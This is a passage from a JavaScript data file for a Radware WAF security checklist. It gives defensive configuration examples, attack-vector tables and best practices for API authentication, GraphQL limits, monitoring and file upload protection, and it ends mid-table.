                <p class="mb-4 text-gray-700">Common attack vectors targeting REST APIs and protection mechanisms:</p>
                <table class="w-full text-left border-collapse mb-6">
                    <thead>
                        <tr>
                            <th class="p-3 border bg-gray-100">Attack Vector</th>
                            <th class="p-3 border bg-gray-100">Description</th>
                            <th class="p-3 border bg-gray-100">Protection Mechanism</th>
                        </tr>
                    </thead>
                    <tbody>
                        <tr>
                            <td class="p-3 border">Parameter Tampering</td>
                            <td class="p-3 border">Manipulation of API parameters or payload values</td>
                            <td class="p-3 border">Schema validation, parameter type enforcement, value constraints</td>
                        </tr>
                        <tr>
                            <td class="p-3 border">Method Tampering</td>
                            <td class="p-3 border">Using inappropriate HTTP methods for endpoints</td>
                            <td class="p-3 border">HTTP method enforcement, method override protection</td>
                        </tr>
                        <tr>
                            <td class="p-3 border">JSON Injection</td>
                            <td class="p-3 border">Inserting malicious content into JSON payloads</td>
                            <td class="p-3 border">JSON schema validation, content structure enforcement</td>
                        </tr>
                        <tr>
                            <td class="p-3 border">Excessive Data</td>
                            <td class="p-3 border">Oversized payloads causing resource exhaustion</td>
                            <td class="p-3 border">Content size limits, array limits, nesting depth controls</td>
                        </tr>
                        <tr>
                            <td class="p-3 border">API Parameter Pollution</td>
                            <td class="p-3 border">Duplicate parameters causing unexpected behavior</td>
                            <td class="p-3 border">Parameter pollution detection, duplicate parameter control</td>
                        </tr>
                        <tr>
                            <td class="p-3 border">BOLA/IDOR</td>
                            <td class="p-3 border">Broken object level authorization attacks</td>
                            <td class="p-3 border">Parameter correlation, object relationship validation</td>
                        </tr>
                        <tr>
                            <td class="p-3 border">Mass Assignment</td>
                            <td class="p-3 border">Overposting to auto-bound parameters</td>
                            <td class="p-3 border">Explicit parameter whitelisting, unused parameter blocking</td>
                        </tr>
                    </tbody>
                </table>
                
                <h5 class="font-semibold mb-2 mt-4 text-gray-800">REST API Security Best Practices</h5>
                <ul class="list-disc pl-6 mb-4 text-gray-700">
                    <li class="mb-2"><strong>Endpoint-Specific Policies:</strong> Create tailored policies for different API endpoints based on risk</li>
                    <li class="mb-2"><strong>Input Validation Layers:</strong> Implement multiple validation layers (format, type, value constraints)</li>
                    <li class="mb-2"><strong>Method Enforcement:</strong> Strictly enforce allowed HTTP methods for each endpoint</li>
                    <li class="mb-2"><strong>Content-Type Validation:</strong> Verify content-type headers match actual payload formats</li>
                    <li class="mb-2"><strong>Resource Limiting:</strong> Implement limits on payload size, array length, and request frequency</li>
                    <li class="mb-2"><strong>API Versioning:</strong> Apply appropriate security controls based on API version</li>
                    <li class="mb-2"><strong>Response Validation:</strong> Verify responses against expected schemas to prevent data leakage</li>
                </ul>
            `
        },
        {
            title: 'API Authentication and Authorization Protection',
            content: `
                <p class="mb-4 text-gray-700">Configure robust access control mechanisms for API services using Radware WAF.</p>
                
                <div class="code-block">
                    <div class="code-comment"># Configure API authentication protection</div>
                    <div><span class="code-command">configure</span> terminal</div>
                    <div><span class="code-command">api-protection</span></div>
                    <div><span class="code-command">authentication</span></div>
                    <div><span class="code-param">state</span> <span class="code-value">enable</span></div>
                    <div class="code-comment"># Configure JWT token validation</div>
                    <div><span class="code-command">jwt</span></div>
                    <div><span class="code-param">jwt-validation</span> <span class="code-value">enable</span></div>
                    <div><span class="code-param">signature-verification</span> <span class="code-value">enable</span></div>
                    <div><span class="code-param">key-file</span> <span class="code-value">"/tmp/jwt_public_key.pem"</span></div>
                    <div><span class="code-param">algorithms</span> <span class="code-value">"RS256,ES256"</span></div>
                    <div><span class="code-param">claim-validation</span> <span class="code-value">enable</span></div>
                    <div><span class="code-param">required-claims</span> <span class="code-value">"iss,exp,iat,sub"</span></div>
                    <div><span class="code-param">expiration-validation</span> <span class="code-value">enable</span></div>
                    <div><span class="code-param">clock-skew</span> <span class="code-value">60</span></div>
                    <div class="code-comment"># Configure OAuth token validation</div>
                    <div><span class="code-command">oauth</span></div>
                    <div><span class="code-param">oauth-validation</span> <span class="code-value">enable</span></div>
                    <div><span class="code-param">introspection-endpoint</span> <span class="code-value">"https://auth.example.com/introspect"</span></div>
                    <div><span class="code-param">client-id</span> <span class="code-value">"waf-validator"</span></div>
                    <div><span class="code-param">client-secret</span> <span class="code-value">"client-secret-value"</span></div>
                    <div><span class="code-param">cache-tokens</span> <span class="code-value">enable</span></div>
                    <div><span class="code-param">cache-ttl</span> <span class="code-value">300</span></div>
                    <div class="code-comment"># Configure API key validation</div>
                    <div><span class="code-command">api-key</span></div>
                    <div><span class="code-param">key-validation</span> <span class="code-value">enable</span></div>
                    <div><span class="code-param">key-location</span> <span class="code-value">"header:X-API-Key,query:api_key"</span></div>
                    <div><span class="code-param">key-format</span> <span class="code-value">regex</span></div>
                    <div><span class="code-param">key-pattern</span> <span class="code-value">"[A-Za-z0-9_-]{32,}"</span></div>
                    <div class="code-comment"># Configure authorization enforcement</div>
                    <div><span class="code-command">authorization</span></div>
                    <div><span class="code-param">rbac-enforcement</span> <span class="code-value">enable</span></div>
                    <div><span class="code-param">scope-validation</span> <span class="code-value">enable</span></div>
                    <div><span class="code-param">scope-claim</span> <span class="code-value">"scope"</span></div>
                    <div><span class="code-param">role-claim</span> <span class="code-value">"roles"</span></div>
                    <div><span class="code-param">permission-mapping-file</span> <span class="code-value">"/tmp/api_permissions.json"</span></div>
                    <div><span class="code-command">commit</span></div>
                    <div><span class="code-command">exit</span></div>
                </div>
                
                <h5 class="font-semibold mb-2 mt-4 text-gray-800">API Authentication Methods</h5>
                <p class="mb-4 text-gray-700">Comparison of common API authentication mechanisms and their security characteristics:</p>
                <table class="w-full text-left border-collapse mb-6">
                    <thead>
                        <tr>
                            <th class="p-3 border bg-gray-100">Authentication Method</th>
                            <th class="p-3 border bg-gray-100">Security Level</th>
                            <th class="p-3 border bg-gray-100">Key Strengths</th>
                            <th class="p-3 border bg-gray-100">Protection Considerations</th>
                        </tr>
                    </thead>
                    <tbody>
                        <tr>
                            <td class="p-3 border">API Keys</td>
                            <td class="p-3 border">Medium</td>
                            <td class="p-3 border">Simple implementation, low overhead</td>
                            <td class="p-3 border">Format validation, key rotation, transport security</td>
                        </tr>
                        <tr>
                            <td class="p-3 border">JWT</td>
                            <td class="p-3 border">High</td>
                            <td class="p-3 border">Self-contained, stateless, rich claims</td>
                            <td class="p-3 border">Signature validation, expiration, claim validation, algorithm enforcement</td>
                        </tr>
                        <tr>
                            <td class="p-3 border">OAuth 2.0</td>
                            <td class="p-3 border">High</td>
                            <td class="p-3 border">Delegation, scope control, central management</td>
                            <td class="p-3 border">Token introspection, scope validation, grant type enforcement</td>
                        </tr>
                        <tr>
                            <td class="p-3 border">MTLS</td>
                            <td class="p-3 border">Very High</td>
                            <td class="p-3 border">Two-way authentication, strong cryptography</td>
                            <td class="p-3 border">Certificate validation, revocation checking, cert management</td>
                        </tr>
                        <tr>
                            <td class="p-3 border">HMAC Signatures</td>
                            <td class="p-3 border">High</td>
                            <td class="p-3 border">Request integrity, replay protection</td>
                            <td class="p-3 border">Signature validation, timestamp validation, nonce checking</td>
                        </tr>
                        <tr>
                            <td class="p-3 border">OpenID Connect</td>
                            <td class="p-3 border">High</td>
                            <td class="p-3 border">Identity layer, standardized claims</td>
                            <td class="p-3 border">ID token validation, issuer validation, audience validation</td>
                        </tr>
                    </tbody>
                </table>
                
                <h5 class="font-semibold mb-2 mt-4 text-gray-800">JWT Security Best Practices</h5>
                <ul class="list-disc pl-6 mb-4 text-gray-700">
                   <li class="mb-2"><strong>Algorithm Validation:</strong> Enforce secure algorithms (RS256, ES256) and reject "none" algorithm</li>
                    <li class="mb-2"><strong>Signature Verification:</strong> Always verify token signatures with proper keys</li>
                    <li class="mb-2"><strong>Expiration Checking:</strong> Enforce and validate token expiration claims</li>
                    <li class="mb-2"><strong>Audience Validation:</strong> Verify the token is intended for your service</li>
                    <li class="mb-2"><strong>Issuer Verification:</strong> Only accept tokens from trusted issuers</li>
                    <li class="mb-2"><strong>Claim Validation:</strong> Validate required claims and their formats</li>
                    <li class="mb-2"><strong>Token Storage:</strong> Protect against token theft with secure storage guidelines</li>
                    <li class="mb-2"><strong>Token Revocation:</strong> Implement mechanisms to invalidate compromised tokens</li>
                </ul>
            `
        },
        {
            title: 'GraphQL Protection',
            content: `
                <p class="mb-4 text-gray-700">Configure specialized protection for GraphQL API endpoints to prevent query abuse and attacks.</p>
                
                <div class="code-block">
                    <div class="code-comment"># Configure GraphQL protection</div>
                    <div><span class="code-command">configure</span> terminal</div>
                    <div><span class="code-command">api-protection</span></div>
                    <div><span class="code-command">graphql</span></div>
                    <div><span class="code-param">state</span> <span class="code-value">enable</span></div>
                    <div class="code-comment"># Configure schema validation</div>
                    <div><span class="code-command">schema</span></div>
                    <div><span class="code-param">schema-validation</span> <span class="code-value">enable</span></div>
                    <div><span class="code-param">schema-file</span> <span class="code-value">"/tmp/schema.graphql"</span></div>
                    <div><span class="code-param">validation-mode</span> <span class="code-value">strict</span></div>
                    <div class="code-comment"># Configure query protection</div>
                    <div><span class="code-command">query-protection</span></div>
                    <div><span class="code-param">max-depth</span> <span class="code-value">10</span></div>
                    <div><span class="code-param">max-complexity</span> <span class="code-value">100</span></div>
                    <div><span class="code-param">max-field-count</span> <span class="code-value">50</span></div>
                    <div><span class="code-param">max-aliases</span> <span class="code-value">5</span></div>
                    <div><span class="code-param">max-directives</span> <span class="code-value">10</span></div>
                    <div class="code-comment"># Configure operation controls</div>
                    <div><span class="code-command">operations</span></div>
                    <div><span class="code-param">operation-validation</span> <span class="code-value">enable</span></div>
                    <div><span class="code-param">operation-name-required</span> <span class="code-value">true</span></div>
                    <div><span class="code-param">allowed-operations</span> <span class="code-value">whitelist</span></div>
                    <div><span class="code-param">operation-whitelist</span> <span class="code-value">"getUserProfile,updateUserProfile,listProducts"</span></div>
                    <div class="code-comment"># Configure introspection protection</div>
                    <div><span class="code-command">introspection</span></div>
                    <div><span class="code-param">state</span> <span class="code-value">restricted</span></div>
                    <div><span class="code-param">authorized-ips</span> <span class="code-value">"10.0.0.0/24,192.168.1.5"</span></div>
                    <div><span class="code-param">authorized-tokens</span> <span class="code-value">enable</span></div>
                    <div><span class="code-param">token-claim</span> <span class="code-value">"role=admin"</span></div>
                    <div class="code-comment"># Configure batch query protection</div>
                    <div><span class="code-command">batch-protection</span></div>
                    <div><span class="code-param">max-batch-size</span> <span class="code-value">5</span></div>
                    <div><span class="code-param">unique-operations-only</span> <span class="code-value">true</span></div>
                    <div><span class="code-command">commit</span></div>
                    <div><span class="code-command">exit</span></div>
                </div>
                
                <h5 class="font-semibold mb-2 mt-4 text-gray-800">GraphQL-Specific Attack Vectors</h5>
                <p class="mb-4 text-gray-700">Unique security challenges posed by GraphQL APIs:</p>
                <table class="w-full text-left border-collapse mb-6">
                    <thead>
                        <tr>
                            <th class="p-3 border bg-gray-100">Attack Vector</th>
                            <th class="p-3 border bg-gray-100">Description</th>
                            <th class="p-3 border bg-gray-100">Protection Mechanism</th>
                        </tr>
                    </thead>
                    <tbody>
                        <tr>
                            <td class="p-3 border">Nested Query Attacks</td>
                            <td class="p-3 border">Deeply nested queries causing resource exhaustion</td>
                            <td class="p-3 border">Query depth limiting, complexity analysis</td>
                        </tr>
                        <tr>
                            <td class="p-3 border">Introspection Abuse</td>
                            <td class="p-3 border">Using introspection to map schema and find vulnerabilities</td>
                            <td class="p-3 border">Introspection restrictions, access controls</td>
                        </tr>
                        <tr>
                            <td class="p-3 border">Batch Query Abuse</td>
                            <td class="p-3 border">Sending numerous queries in a single request</td>
                            <td class="p-3 border">Batch size limits, operation uniqueness checking</td>
                        </tr>
                        <tr>
                            <td class="p-3 border">Field Suggestion Attacks</td>
                            <td class="p-3 border">Exploiting field suggestions for data exposure</td>
                            <td class="p-3 border">Strict schema validation, field-level access controls</td>
                        </tr>
                        <tr>
                            <td class="p-3 border">Query Aliases Abuse</td>
                            <td class="p-3 border">Using multiple aliases to bypass query limits</td>
                            <td class="p-3 border">Alias count limiting, complexity calculations</td>
                        </tr>
                        <tr>
                            <td class="p-3 border">Fragment Abuse</td>
                            <td class="p-3 border">Excessive fragments to obfuscate complex queries</td>
                            <td class="p-3 border">Fragment count limits, fragment spread restriction</td>
                        </tr>
                        <tr>
                            <td class="p-3 border">Directive Abuse</td>
                            <td class="p-3 border">Excessive use of directives to manipulate execution</td>
                            <td class="p-3 border">Directive count limits, allowed directive lists</td>
                        </tr>
                    </tbody>
                </table>
                
                <h5 class="font-semibold mb-2 mt-4 text-gray-800">GraphQL Query Complexity Analysis</h5>
                <p class="mb-4 text-gray-700">Methods to calculate and control GraphQL query complexity:</p>
                <ul class="list-disc pl-6 mb-4 text-gray-700">
                    <li class="mb-2"><strong>Field-Based Complexity:</strong> Assign complexity values to individual fields</li>
                    <li class="mb-2"><strong>Type Weighting:</strong> Assign higher weights to expensive object types</li>
                    <li class="mb-2"><strong>Depth Multipliers:</strong> Increase complexity exponentially with nesting depth</li>
                    <li class="mb-2"><strong>Argument Factoring:</strong> Adjust complexity based on argument values (e.g., limits)</li>
                    <li class="mb-2"><strong>Resolver Complexity:</strong> Account for backend operation complexity</li>
                    <li class="mb-2"><strong>Pagination Awareness:</strong> Calculate complexity based on requested page sizes</li>
                    <li class="mb-2"><strong>Dynamic Complexity:</strong> Adjust thresholds based on current system load</li>
                </ul>
            `
        },
        {
            title: 'API Security Monitoring and Analytics',
            content: `
                <p class="mb-4 text-gray-700">Configure comprehensive monitoring and analytics for API security events in Radware WAF.</p>
                
                <div class="code-block">
                    <div class="code-comment"># Configure API security monitoring</div>
                    <div><span class="code-command">configure</span> terminal</div>
                    <div><span class="code-command">api-protection</span></div>
                    <div><span class="code-command">monitoring</span></div>
                    <div><span class="code-param">state</span> <span class="code-value">enable</span></div>
                    <div class="code-comment"># Configure logging settings</div>
                    <div><span class="code-command">logging</span></div>
                    <div><span class="code-param">api-access-logging</span> <span class="code-value">enable</span></div>
                    <div><span class="code-param">detailed-request-logging</span> <span class="code-value">enable</span></div>
                    <div><span class="code-param">parameter-logging</span> <span class="code-value">enable</span></div>
                    <div><span class="code-param">sensitive-data-masking</span> <span class="code-value">enable</span></div>
                    <div><span class="code-param">log-format</span> <span class="code-value">json</span></div>
                    <div class="code-comment"># Configure API analytics</div>
                    <div><span class="code-command">analytics</span></div>
                    <div><span class="code-param">api-usage-tracking</span> <span class="code-value">enable</span></div>
                    <div><span class="code-param">client-tracking</span> <span class="code-value">enable</span></div>
                    <div><span class="code-param">response-time-tracking</span> <span class="code-value">enable</span></div>
                    <div><span class="code-param">error-rate-tracking</span> <span class="code-value">enable</span></div>
                    <div><span class="code-param">payload-size-tracking</span> <span class="code-value">enable</span></div>
                    <div class="code-comment"># Configure alerting thresholds</div>
                    <div><span class="code-command">alerts</span></div>
                    <div><span class="code-param">error-rate-threshold</span> <span class="code-value">10</span></div>
                    <div><span class="code-param">response-time-threshold</span> <span class="code-value">2000</span></div>
                    <div><span class="code-param">traffic-spike-threshold</span> <span class="code-value">500</span></div>
                    <div><span class="code-param">alert-recipients</span> <span class="code-value">api-admins@example.com</span></div>
                    <div class="code-comment"># Configure API security dashboard</div>
                    <div><span class="code-command">dashboard</span></div>
                    <div><span class="code-param">state</span> <span class="code-value">enable</span></div>
                    <div><span class="code-param">refresh-interval</span> <span class="code-value">60</span></div>
                    <div><span class="code-param">historical-data-retention</span> <span class="code-value">90</span></div>
                    <div><span class="code-command">commit</span></div>
                    <div><span class="code-command">exit</span></div>
                </div>
                
                <h5 class="font-semibold mb-2 mt-4 text-gray-800">API Security Metrics</h5>
                <p class="mb-4 text-gray-700">Key metrics to monitor for effective API security:</p>
                <table class="w-full text-left border-collapse mb-6">
                    <thead>
                        <tr>
                            <th class="p-3 border bg-gray-100">Metric Category</th>
                            <th class="p-3 border bg-gray-100">Key Metrics</th>
                            <th class="p-3 border bg-gray-100">Security Significance</th>
                        </tr>
                    </thead>
                    <tbody>
                        <tr>
                            <td class="p-3 border">Authentication & Authorization</td>
                            <td class="p-3 border">Failed auth attempts, token validation failures, unauthorized access attempts</td>
                            <td class="p-3 border">Indicates potential credential stuffing, brute force, or permission escalation attempts</td>
                        </tr>
                        <tr>
                            <td class="p-3 border">Request Anomalies</td>
                            <td class="p-3 border">Schema validation failures, parameter violations, content type mismatches</td>
                            <td class="p-3 border">Signals potential fuzzing, injection attempts, or client library issues</td>
                        </tr>
                        <tr>
                            <td class="p-3 border">Rate & Volume</td>
                            <td class="p-3 border">Requests per minute, data volume, burst rates, endpoint-specific rates</td>
                            <td class="p-3 border">Helps identify DoS attempts, data harvesting, or abnormal usage patterns</td>
                        </tr>
                        <tr>
                            <td class="p-3 border">Performance</td>
                            <td class="p-3 border">Response times, timeout rates, error rates</td>
                            <td class="p-3 border">Can indicate resource exhaustion attacks or backend service issues</td>
                        </tr>
                        <tr>
                            <td class="p-3 border">Client Behavior</td>
                            <td class="p-3 border">Client distribution, user-agent patterns, IP reputation</td>
                            <td class="p-3 border">Helps identify suspicious clients, script automation, or geographic anomalies</td>
                        </tr>
                        <tr>
                            <td class="p-3 border">Data Exposure</td>
                            <td class="p-3 border">Response size, sensitive data triggers, excessive data returns</td>
                            <td class="p-3 border">May indicate data exfiltration attempts or misconfigured responses</td>
                        </tr>
                    </tbody>
                </table>
                
                <h5 class="font-semibold mb-2 mt-4 text-gray-800">API Security Monitoring Best Practices</h5>
                <ul class="list-disc pl-6 mb-4 text-gray-700">
                    <li class="mb-2"><strong>Baseline Establishment:</strong> Create normal usage baselines for each API endpoint</li>
                    <li class="mb-2"><strong>Anomaly Detection:</strong> Implement statistical anomaly detection for early warning</li>
                    <li class="mb-2"><strong>Correlation Analysis:</strong> Correlate API security events with other system activities</li>
                    <li class="mb-2"><strong>Business Context:</strong> Incorporate business logic awareness into monitoring</li>
                    <li class="mb-2"><strong>Progressive Alerting:</strong> Implement tiered alert thresholds based on severity</li>
                    <li class="mb-2"><strong>Trend Analysis:</strong> Monitor for gradual changes in patterns over time</li>
                    <li class="mb-2"><strong>Client Profiling:</strong> Build and monitor client behavior profiles for deviations</li>
                    <li class="mb-2"><strong>Endpoint-Specific Rules:</strong> Customize monitoring thresholds per endpoint sensitivity</li>
                </ul>
            `
        }
    ],
    tools: [
        {
            title: 'API Schema Validator',
            icon: 'fa-check-circle',
            description: 'Tool for validating API traffic against OpenAPI, WSDL, and GraphQL schemas.',
            link: 'https://www.radware.com/products/appwall/',
            linkText: 'Schema Validation'
        },
        {
            title: 'GraphQL Query Analyzer',
            icon: 'fa-project-diagram',
            description: 'Specialized tool for analyzing and restricting complex GraphQL queries.',
            link: 'https://www.radware.com/products/appwall/',
            linkText: 'GraphQL Security'
        },
        {
            title: 'JWT Token Inspector',
            icon: 'fa-key',
            description: 'Tool for validating and inspecting JWT tokens used in API authentication.',
            link: 'https://www.radware.com/products/appwall/',
            linkText: 'Token Verification'
        },
        {
            title: 'API Discovery Scanner',
            icon: 'fa-search',
            description: 'Automated discovery and inventory tool for API endpoints and shadow APIs.',
            link: 'https://www.radware.com/products/appwall/',
            linkText: 'API Discovery'
        },
        {
            title: 'API Security Dashboard',
            icon: 'fa-chart-line',
            description: 'Comprehensive dashboard for API security monitoring and analytics.',
            link: 'https://www.radware.com/products/appwall/',
            linkText: 'Security Analytics'
        },
        {
            title: 'API Access Control Manager',
            icon: 'fa-user-lock',
            description: 'Centralized management for API authentication and authorization policies.',
            link: 'https://www.radware.com/products/appwall/',
            linkText: 'Access Control'
        }
    ]
},

{
    id: 'file-upload-protection',
    title: '16. File Upload Protection',
    subtitle: 'Specialized security controls for file upload functionality in Radware WAF',
    icon: 'fa-file-upload',
    priority: 'critical',
    progress: 0,
    checklist: [
        {
            title: '16.1 File Type Validation',
            icon: 'fa-file-alt',
            items: [
                { id: '16.1.1', text: 'Configure allowed file type enforcement', priority: 'critical' },
                { id: '16.1.2', text: 'Set up MIME type validation', priority: 'high' },
                { id: '16.1.3', text: 'Implement file content analysis', priority: 'critical' },
                { id: '16.1.4', text: 'Configure file extension validation', priority: 'high' },
                { id: '16.1.5', text: 'Set up media file validation', priority: 'medium' },
                { id: '16.1.6', text: 'Implement document format validation', priority: 'high' },
                { id: '16.1.7', text: 'Configure archive file inspection', priority: 'high' },
                { id: '16.1.8', text: 'Set up file type mismatch detection', priority: 'high' }
            ]
        },
        {
            title: '16.2 File Content Security',
            icon: 'fa-shield-alt',
            items: [
                { id: '16.2.1', text: 'Configure malware scanning for uploads', priority: 'critical' },
                { id: '16.2.2', text: 'Set up embedded malicious code detection', priority: 'high' },
                { id: '16.2.3', text: 'Implement XSS protection in file contents', priority: 'high' },
                { id: '16.2.4', text: 'Configure metadata stripping and validation', priority: 'medium' },
                { id: '16.2.5', text: 'Set up active content neutralization', priority: 'high' },
                { id: '16.2.6', text: 'Implement file content sanitization', priority: 'high' },
                { id: '16.2.7', text: 'Configure script detection in uploads', priority: 'critical' },
                { id: '16.2.8', text: 'Set up embedded object detection', priority: 'medium' }
            ]
        },
        {
            title: '16.3 Upload Controls',
            icon: 'fa-sliders-h',
            items: [
                { id: '16.3.1', text: 'Configure file size limits', priority: 'high' },
                { id: '16.3.2', text: 'Set up file quantity limits', priority: 'medium' },
                { id: '16.3.3', text: 'Implement upload frequency controls', priority: 'high' },
                { id: '16.3.4', text: 'Configure upload directory traversal protection', priority: 'critical' },
                { id: '16.3.5', text: 'Set up file name security controls', priority: 'high' },
                { id: '16.3.6', text: 'Implement file overwrite protection', priority: 'high' },
                { id: '16.3.7', text: 'Configure temporary file handling', priority: 'medium' },
                { id: '16.3.8', text: 'Set up file upload authentication enforcement', priority: 'high' }
            ]
        },
        {
            title: '16.4 Advanced Protection',
            icon: 'fa-microscope',
            items: [
                { id: '16.4.1', text: 'Configure antivirus integration', priority: 'high' },
                { id: '16.4.2', text: 'Set up sandbox analysis for suspicious files', priority: 'medium' },
                { id: '16.4.3', text: 'Implement image content analysis', priority: 'medium' },
                { id: '16.4.4', text: 'Configure file entropy analysis', priority: 'medium' },
                { id: '16.4.5', text: 'Set up machine learning-based file analysis', priority: 'medium' },
                { id: '16.4.6', text: 'Implement file upload correlation analysis', priority: 'medium' },
                { id: '16.4.7', text: 'Configure file reputation checking', priority: 'high' },
                { id: '16.4.8', text: 'Set up decompression bomb protection', priority: 'high' }
            ]
        }
    ],
    techniques: [
        {
            title: 'File Type Validation Configuration',
            content: `
                <p class="mb-4 text-gray-700">Configure Radware WAF to properly validate and restrict file types for upload functionality.</p>
                
                <div class="code-block">
                    <div class="code-comment"># Configure file upload protection</div>
                    <div><span class="code-command">configure</span> terminal</div>
                    <div><span class="code-command">file-protection</span></div>
                    <div><span class="code-param">state</span> <span class="code-value">enable</span></div>
                    <div class="code-comment"># Configure allowed file types</div>
                    <div><span class="code-command">allowed-types</span></div>
                    <div><span class="code-param">extensions</span> <span class="code-value">"jpg,jpeg,png,gif,pdf,doc,docx,xls,xlsx,txt"</span></div>
                    <div><span class="code-param">content-verification</span> <span class="code-value">enable</span></div>
                    <div><span class="code-param">block-unlisted</span> <span class="code-value">enable</span></div>
                    <div class="code-comment"># Configure MIME type validation</div>
                    <div><span class="code-command">mime-validation</span></div>
                    <div><span class="code-param">state</span> <span class="code-value">enable</span></div>
                    <div><span class="code-param">allowed-types</span> <span class="code-value">"image/jpeg,image/png,image/gif,application/pdf,application/msword,application/vnd.openxmlformats-officedocument.wordprocessingml.document,text/plain"</span></div>
                    <div><span class="code-param">verify-content-type</span> <span class="code-value">enable</span></div>
                    <div class="code-comment"># Configure file content analysis</div>
                    <div><span class="code-command">content-analysis</span></div>
                    <div><span class="code-param">file-fingerprinting</span> <span class="code-value">enable</span></div>
                    <div><span class="code-param">binary-signature-check</span> <span class="code-value">enable</span></div>
                    <div><span class="code-param">content-type-verification</span> <span class="code-value">enable</span></div>
                    <div><span class="code-param">validate-image-files</span> <span class="code-value">enable</span></div>
                    <div><span class="code-param">validate-pdf-files</span> <span class="code-value">enable</span></div>
                    <div><span class="code-param">validate-office-files</span> <span class="code-value">enable</span></div>
                    <div><span class="code-command">commit</span></div>
                    <div><span class="code-command">exit</span></div>
                </div>
                
                <h5 class="font-semibold mb-2 mt-4 text-gray-800">File Type Security Matrix</h5>
                <p class="mb-4 text-gray-700">Security considerations for different file types:</p>
                <table class="w-full text-left border-collapse mb-6">
                    <thead>
                        <tr>
                            <th class="p-3 border bg-gray-100">File Category</th>
                            <th class="p-3 border bg-gray-100">Risk Level</th>
                            <th class="p-3 border bg-gray-100">Common Attacks</th>
                            <th class="p-3 border bg-gray-100">Validation Requirements</th>
                        </tr>
                    </thead>
                    <tbody>
                        <tr>
                            <td class="p-3 border">Images (JPG, PNG, GIF)</td>
                            <td class="p-3 border">Medium</td>
                            <td class="p-3 border">XSS via metadata, steganography, exploits in parsers</td>
                            <td class="p-3 border">Image structure validation, metadata stripping, file format check</td>
                        </tr>
                        <tr>
                            <td class="p-3 border">Documents (PDF, DOC)</td>
                            <td class="p-3 border">High</td>
                            <td class="p-3 border">Embedded scripts, macros, exploits, malicious links</td>
                            <td class="p-3 border">Active content removal, deep structure analysis, macro detection</td>
                        </tr>
                        <tr>
                            <td class="p-3 border">Archives (ZIP, RAR)</td>
                            <td class="p-3 border">Very High</td>
                            <td class="p-3 border">Nested malware, zip bombs, path traversal</td>
                            <td class="p-3 border">Depth-limited extraction, file count checking, nested file validation</td>
                        </tr>
                        <tr>
                            <td class="p-3 border">Text/Config (TXT, XML, JSON)</td>
                            <td class="p-3 border">Medium</td>
                            <td class="p-3 border">Injection attacks, XXE, dangerous content</td>
                            <td class="p-3 border">Content sanitization, schema validation, injection protection</td>
                        </tr>
                        <tr>
                            <td class="p-3 border">Executables (EXE, DLL)</td>
                            <td class="p-3 border">Extreme</td>
                            <td class="p-3 border">Direct malware, system exploitation</td>
                            <td class="p-3 border">Usually blocked entirely, or sandboxed analysis</td>
                        </tr>
                        <tr>
                            <td class="p-3 border">Media (MP3, MP4)</td>
                            <td class="p-3 border">Medium-High</td>
                            <td class="p-3 border">Malicious code in containers, player exploits</td>
                            <td class="p-3 border">Container validation, codec verification, metadata analysis</td>
                        </tr>
                    </tbody>
                </table>
                
                <h5 class="font-semibold mb-2 mt-4 text-gray-800">File Type Validation Best Practices</h5>
                <ul class="list-disc pl-6 mb-4 text-gray-700">
                    <li class="mb-2"><strong>Multiple Validation Layers:</strong> Use both extension and content-based validation</li>
                    <li class="mb-2"><strong>Magic Byte Analysis:</strong> Verify file contents against file signatures</li>
                    <li class="mb-2"><strong>Whitelist Approach:</strong> Only allow specifically approved file types</li>
                    <li class="mb-2"><strong>Content-Type Verification:</strong> Ensure MIME type matches actual content</li>
                    <li class="mb-2"><strong>Deep File Inspection:</strong> Validate entire file structure, not just headers</li>
                    <li class="mb-2"><strong>Format-Specific Validation:</strong> Apply specialized validation for each file format</li>
                    <li class="mb-2"><strong>Consistent Enforcement:</strong> Apply validation across all upload endpoints</li>
                </ul>
            `
        },
        {
            title: 'Malicious Content Detection',
            content: `
                <p class="mb-4 text-gray-700">Configure Radware WAF to detect and block malicious content within uploaded files.</p>
                
                <div class="code-block">
                    <div class="code-comment"># Configure malicious content detection</div>
                    <div><span class="code-command">configure</span> terminal</div>
                    <div><span class="code-command">file-protection</span></div>
                    <div><span class="code-command">malicious-content</span></div>
                    <div><span class="code-param">state</span> <span class="code-value">enable</span></div>
                    <div class="code-comment"># Configure malware scanning</div>
                    <div><span class="code-command">antivirus</span></div>
                    <div><span class="code-param">scanning</span> <span class="code-value">enable</span></div>
                    <div><span class="code-param">scan-engine</span> <span class="code-value">integrated</span></div>
                    <div><span class="code-param">max-file-size</span> <span class="code-value">50MB</span></div>
                    <div><span class="code-param">action-on-detection</span> <span class="code-value">block</span></div>
                    <div class="code-comment"># Configure code detection</div>
                    <div><span class="code-command">code-detection</span></div>
                    <div><span class="code-param">detect-scripts</span> <span class="code-value">enable</span></div>
                    <div><span class="code-param">detect-macros</span> <span class="code-value">enable</span></div>
                    <div><span class="code-param">detect-embedded-objects</span> <span class="code-value">enable</span></div>
                    <div><span class="code-param">detect-executable-content</span> <span class="code-value">enable</span></div>
                    <div><span class="code-param">script-patterns</span> <span class="code-value">"<script,javascript:,vbscript:,data:text/html"</span></div>
                    <div class="code-comment"># Configure content sanitization</div>
                    <div><span class="code-command">sanitization</span></div>
                    <div><span class="code-param">strip-metadata</span> <span class="code-value">enable</span></div>
                    <div><span class="code-param">neutralize-active-content</span> <span class="code-value">enable</span></div>
                    <div><span class="code-param">sanitize-office-macros</span> <span class="code-value">enable</span></div>
                    <div><span class="code-param">sanitize-pdf-javascript</span> <span class="code-value">enable</span></div>
                    <div><span class="code-param">sanitize-html-content</span> <span class="code-value">enable</span></div>
                    <div><span class="code-param">action-on-failure</span> <span class="code-value">block</span></div>
                    <div><span class="code-command">commit</span></div>
                    <div><span class="code-command">exit</span></div>
                </div>
                
                <h5 class="font-semibold mb-2 mt-4 text-gray-800">Malicious Content Types</h5>
                <p class="mb-4 text-gray-700">Common types of malicious content found in uploaded files:</p>
                <table class="w-full text-left border-collapse mb-6">
                    <thead>
                        <tr>
                            <th class="p-3 border bg-gray-100">Content Type</th>
                            <th class="p-3 border bg-gray-100">Description</th>
                            <th class="p-3 border bg-gray-100">Detection Method</th>
                        </tr>
                    </thead>
                    <tbody>
                        <tr>
                            <td class="p-3 border">Embedded Scripts</td>
                            <td class="p-3 border">JavaScript, VBScript, or other scripting code embedded in files</td>
                            <td class="p-3 border">Pattern matching, script tag detection, content analysis</td>
                        </tr>
                        <tr>
                            <td class="p-3 border">Macros</td>
                            <td class="p-3 border">Potentially malicious macro code in Office documents</td>
                            <td class="p-3 border">VBA detection, macro signature analysis, behavior checking</td>
                        </tr>
                        <tr>
                            <td class="p-3 border">Executable Code</td>
